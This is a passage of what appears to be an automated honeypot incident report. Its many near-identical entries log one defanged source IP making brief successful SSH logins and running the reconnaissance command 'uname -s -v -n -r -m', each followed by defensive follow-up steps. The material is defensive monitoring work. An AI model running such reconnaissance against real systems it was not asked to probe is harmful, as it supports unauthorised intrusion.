| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:09` | `cowrie.session.connect` |
| `2026-07-04 14:56:09` | `cowrie.client.version` |
| `2026-07-04 14:56:09` | `cowrie.client.kex` |
| `2026-07-04 14:56:10` | `cowrie.login.success` |
| `2026-07-04 14:56:10` | `cowrie.session.params` |
| `2026-07-04 14:56:10` | `cowrie.command.input` |
| `2026-07-04 14:56:11` | `cowrie.log.closed` |
| `2026-07-04 14:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-786866729f02

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:12` | `cowrie.session.connect` |
| `2026-07-04 14:56:12` | `cowrie.client.version` |
| `2026-07-04 14:56:12` | `cowrie.client.kex` |
| `2026-07-04 14:56:13` | `cowrie.login.success` |
| `2026-07-04 14:56:13` | `cowrie.session.params` |
| `2026-07-04 14:56:13` | `cowrie.command.input` |
| `2026-07-04 14:56:13` | `cowrie.log.closed` |
| `2026-07-04 14:56:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38c44520514a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:16` | `cowrie.session.connect` |
| `2026-07-04 14:56:16` | `cowrie.client.version` |
| `2026-07-04 14:56:16` | `cowrie.client.kex` |
| `2026-07-04 14:56:16` | `cowrie.login.success` |
| `2026-07-04 14:56:17` | `cowrie.session.params` |
| `2026-07-04 14:56:17` | `cowrie.command.input` |
| `2026-07-04 14:56:17` | `cowrie.log.closed` |
| `2026-07-04 14:56:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76b21f9252a5

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:19` | `cowrie.session.connect` |
| `2026-07-04 14:56:19` | `cowrie.client.version` |
| `2026-07-04 14:56:19` | `cowrie.client.kex` |
| `2026-07-04 14:56:19` | `cowrie.login.success` |
| `2026-07-04 14:56:20` | `cowrie.session.params` |
| `2026-07-04 14:56:20` | `cowrie.command.input` |
| `2026-07-04 14:56:20` | `cowrie.log.closed` |
| `2026-07-04 14:56:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31f3b1278548

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:22` | `cowrie.session.connect` |
| `2026-07-04 14:56:22` | `cowrie.client.version` |
| `2026-07-04 14:56:22` | `cowrie.client.kex` |
| `2026-07-04 14:56:22` | `cowrie.login.success` |
| `2026-07-04 14:56:23` | `cowrie.session.params` |
| `2026-07-04 14:56:23` | `cowrie.command.input` |
| `2026-07-04 14:56:23` | `cowrie.log.closed` |
| `2026-07-04 14:56:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-743e36dcb272

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:25` | `cowrie.session.connect` |
| `2026-07-04 14:56:25` | `cowrie.client.version` |
| `2026-07-04 14:56:25` | `cowrie.client.kex` |
| `2026-07-04 14:56:26` | `cowrie.login.success` |
| `2026-07-04 14:56:27` | `cowrie.session.params` |
| `2026-07-04 14:56:27` | `cowrie.command.input` |
| `2026-07-04 14:56:27` | `cowrie.log.closed` |
| `2026-07-04 14:56:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-706306bae3fc

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:28` | `cowrie.session.connect` |
| `2026-07-04 14:56:28` | `cowrie.client.version` |
| `2026-07-04 14:56:29` | `cowrie.client.kex` |
| `2026-07-04 14:56:29` | `cowrie.login.success` |
| `2026-07-04 14:56:30` | `cowrie.session.params` |
| `2026-07-04 14:56:30` | `cowrie.command.input` |
| `2026-07-04 14:56:30` | `cowrie.log.closed` |
| `2026-07-04 14:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bb734c124f7

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:32` | `cowrie.session.connect` |
| `2026-07-04 14:56:32` | `cowrie.client.version` |
| `2026-07-04 14:56:32` | `cowrie.client.kex` |
| `2026-07-04 14:56:32` | `cowrie.login.success` |
| `2026-07-04 14:56:33` | `cowrie.session.params` |
| `2026-07-04 14:56:33` | `cowrie.command.input` |
| `2026-07-04 14:56:33` | `cowrie.log.closed` |
| `2026-07-04 14:56:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d03699b8df29

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:35` | `cowrie.session.connect` |
| `2026-07-04 14:56:35` | `cowrie.client.version` |
| `2026-07-04 14:56:35` | `cowrie.client.kex` |
| `2026-07-04 14:56:35` | `cowrie.login.success` |
| `2026-07-04 14:56:36` | `cowrie.session.params` |
| `2026-07-04 14:56:36` | `cowrie.command.input` |
| `2026-07-04 14:56:36` | `cowrie.log.closed` |
| `2026-07-04 14:56:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-213a81723942

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:38` | `cowrie.session.connect` |
| `2026-07-04 14:56:38` | `cowrie.client.version` |
| `2026-07-04 14:56:38` | `cowrie.client.kex` |
| `2026-07-04 14:56:39` | `cowrie.login.success` |
| `2026-07-04 14:56:39` | `cowrie.session.params` |
| `2026-07-04 14:56:39` | `cowrie.command.input` |
| `2026-07-04 14:56:39` | `cowrie.log.closed` |
| `2026-07-04 14:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfaa6c983060

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:41` | `cowrie.session.connect` |
| `2026-07-04 14:56:41` | `cowrie.client.version` |
| `2026-07-04 14:56:41` | `cowrie.client.kex` |
| `2026-07-04 14:56:42` | `cowrie.login.success` |
| `2026-07-04 14:56:43` | `cowrie.session.params` |
| `2026-07-04 14:56:43` | `cowrie.command.input` |
| `2026-07-04 14:56:43` | `cowrie.log.closed` |
| `2026-07-04 14:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd84ff9bcb7c

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:44` | `cowrie.session.connect` |
| `2026-07-04 14:56:44` | `cowrie.client.version` |
| `2026-07-04 14:56:45` | `cowrie.client.kex` |
| `2026-07-04 14:56:45` | `cowrie.login.success` |
| `2026-07-04 14:56:46` | `cowrie.session.params` |
| `2026-07-04 14:56:46` | `cowrie.command.input` |
| `2026-07-04 14:56:46` | `cowrie.log.closed` |
| `2026-07-04 14:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5928024acbe0

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:48` | `cowrie.session.connect` |
| `2026-07-04 14:56:48` | `cowrie.client.version` |
| `2026-07-04 14:56:48` | `cowrie.client.kex` |
| `2026-07-04 14:56:48` | `cowrie.login.success` |
| `2026-07-04 14:56:49` | `cowrie.session.params` |
| `2026-07-04 14:56:49` | `cowrie.command.input` |
| `2026-07-04 14:56:49` | `cowrie.log.closed` |
| `2026-07-04 14:56:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-415e43a79a35

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:51` | `cowrie.session.connect` |
| `2026-07-04 14:56:51` | `cowrie.client.version` |
| `2026-07-04 14:56:51` | `cowrie.client.kex` |
| `2026-07-04 14:56:51` | `cowrie.login.success` |
| `2026-07-04 14:56:52` | `cowrie.session.params` |
| `2026-07-04 14:56:52` | `cowrie.command.input` |
| `2026-07-04 14:56:52` | `cowrie.log.closed` |
| `2026-07-04 14:56:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-834d2769e042

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:54` | `cowrie.session.connect` |
| `2026-07-04 14:56:54` | `cowrie.client.version` |
| `2026-07-04 14:56:54` | `cowrie.client.kex` |
| `2026-07-04 14:56:54` | `cowrie.login.success` |
| `2026-07-04 14:56:55` | `cowrie.session.params` |
| `2026-07-04 14:56:55` | `cowrie.command.input` |
| `2026-07-04 14:56:55` | `cowrie.log.closed` |
| `2026-07-04 14:56:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5e4cca22858

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:56 |
| **Last Seen** | 2026-07-04 14:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:56:57` | `cowrie.session.connect` |
| `2026-07-04 14:56:57` | `cowrie.client.version` |
| `2026-07-04 14:56:57` | `cowrie.client.kex` |
| `2026-07-04 14:56:58` | `cowrie.login.success` |
| `2026-07-04 14:56:58` | `cowrie.session.params` |
| `2026-07-04 14:56:58` | `cowrie.command.input` |
| `2026-07-04 14:56:58` | `cowrie.log.closed` |
| `2026-07-04 14:56:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-faf715462a2a

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:00` | `cowrie.session.connect` |
| `2026-07-04 14:57:00` | `cowrie.client.version` |
| `2026-07-04 14:57:00` | `cowrie.client.kex` |
| `2026-07-04 14:57:01` | `cowrie.login.success` |
| `2026-07-04 14:57:02` | `cowrie.session.params` |
| `2026-07-04 14:57:02` | `cowrie.command.input` |
| `2026-07-04 14:57:02` | `cowrie.log.closed` |
| `2026-07-04 14:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ef784dc1e59

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:04` | `cowrie.session.connect` |
| `2026-07-04 14:57:04` | `cowrie.client.version` |
| `2026-07-04 14:57:04` | `cowrie.client.kex` |
| `2026-07-04 14:57:04` | `cowrie.login.success` |
| `2026-07-04 14:57:05` | `cowrie.session.params` |
| `2026-07-04 14:57:05` | `cowrie.command.input` |
| `2026-07-04 14:57:05` | `cowrie.log.closed` |
| `2026-07-04 14:57:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5e22d6ff906

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:07` | `cowrie.session.connect` |
| `2026-07-04 14:57:07` | `cowrie.client.version` |
| `2026-07-04 14:57:07` | `cowrie.client.kex` |
| `2026-07-04 14:57:07` | `cowrie.login.success` |
| `2026-07-04 14:57:08` | `cowrie.session.params` |
| `2026-07-04 14:57:08` | `cowrie.command.input` |
| `2026-07-04 14:57:08` | `cowrie.log.closed` |
| `2026-07-04 14:57:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac483465ad37

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:10` | `cowrie.session.connect` |
| `2026-07-04 14:57:10` | `cowrie.client.version` |
| `2026-07-04 14:57:10` | `cowrie.client.kex` |
| `2026-07-04 14:57:10` | `cowrie.login.success` |
| `2026-07-04 14:57:11` | `cowrie.session.params` |
| `2026-07-04 14:57:11` | `cowrie.command.input` |
| `2026-07-04 14:57:11` | `cowrie.log.closed` |
| `2026-07-04 14:57:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-122f3cb56c63

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:13` | `cowrie.session.connect` |
| `2026-07-04 14:57:13` | `cowrie.client.version` |
| `2026-07-04 14:57:13` | `cowrie.client.kex` |
| `2026-07-04 14:57:14` | `cowrie.login.success` |
| `2026-07-04 14:57:14` | `cowrie.session.params` |
| `2026-07-04 14:57:14` | `cowrie.command.input` |
| `2026-07-04 14:57:14` | `cowrie.log.closed` |
| `2026-07-04 14:57:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c239bcaefd2

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:16` | `cowrie.session.connect` |
| `2026-07-04 14:57:16` | `cowrie.client.version` |
| `2026-07-04 14:57:17` | `cowrie.client.kex` |
| `2026-07-04 14:57:17` | `cowrie.login.success` |
| `2026-07-04 14:57:18` | `cowrie.session.params` |
| `2026-07-04 14:57:18` | `cowrie.command.input` |
| `2026-07-04 14:57:18` | `cowrie.log.closed` |
| `2026-07-04 14:57:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25f3aabf5a30

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:20` | `cowrie.session.connect` |
| `2026-07-04 14:57:20` | `cowrie.client.version` |
| `2026-07-04 14:57:20` | `cowrie.client.kex` |
| `2026-07-04 14:57:20` | `cowrie.login.success` |
| `2026-07-04 14:57:21` | `cowrie.session.params` |
| `2026-07-04 14:57:21` | `cowrie.command.input` |
| `2026-07-04 14:57:21` | `cowrie.log.closed` |
| `2026-07-04 14:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0a7fdd4120d

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:23` | `cowrie.session.connect` |
| `2026-07-04 14:57:23` | `cowrie.client.version` |
| `2026-07-04 14:57:23` | `cowrie.client.kex` |
| `2026-07-04 14:57:23` | `cowrie.login.success` |
| `2026-07-04 14:57:24` | `cowrie.session.params` |
| `2026-07-04 14:57:24` | `cowrie.command.input` |
| `2026-07-04 14:57:24` | `cowrie.log.closed` |
| `2026-07-04 14:57:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7e87fc4a209

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:26` | `cowrie.session.connect` |
| `2026-07-04 14:57:26` | `cowrie.client.version` |
| `2026-07-04 14:57:26` | `cowrie.client.kex` |
| `2026-07-04 14:57:26` | `cowrie.login.success` |
| `2026-07-04 14:57:27` | `cowrie.session.params` |
| `2026-07-04 14:57:27` | `cowrie.command.input` |
| `2026-07-04 14:57:27` | `cowrie.log.closed` |
| `2026-07-04 14:57:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-55e816801dad

| Field | Detail |
|---|---|
| **Source IP** | `45.153.34[.]235` |
| **First Seen** | 2026-07-04 14:57 |
| **Last Seen** | 2026-07-04 14:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 14:57:29` | `cowrie.session.connect` |
| `2026-07-04 14:57:29` | `cowrie.client.version` |
| `2026-07-04 14:57:29` | `cowrie.client.kex` |
| `2026-07-04 14:57:30` | `cowrie.login.success` |
| `2026-07-04 14:57:30` | `cowrie.session.params` |
| `2026-07-04 14:57:30` | `cowrie.command.input` |
| `2026-07-04 14:57:30` | `cowrie.log.closed` |
| `2026-07-04 14:57:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.153.34[.]235` to AbuseIPDB if not already reported
- [ ] Block `45.153.34[.]235` at perimeter firewall / security group
